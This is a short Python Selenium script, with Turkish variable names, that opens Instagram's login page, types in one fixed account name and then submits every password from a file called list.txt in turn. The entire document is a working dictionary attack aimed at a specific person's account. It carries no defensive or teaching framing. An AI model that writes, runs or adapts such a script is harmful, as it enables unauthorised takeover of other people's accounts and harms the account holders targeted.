from selenium import webdriver
import time




tarayici = webdriver.Firefox()
tarayici.get("https://www.instagram.com/accounts/login/?hl=tr")


time.sleep(5)
usernames = tarayici.find_element_by_name("username")
passwords =  tarayici.find_element_by_name("password")
button = tarayici.find_element_by_xpath('//*[@id="react-root"]/section/main/div/article/div/div[1]/div/form/div[4]/button/div')


with open("list.txt","r") as file:
    for satır in file:
        usernames.send_keys("aslannparia1")
        passwords.send_keys(satır)
        button.click()

        time.sleep(2)
        usernames.clear()
        passwords.clear()


time.sleep(10)
tarayici.close()
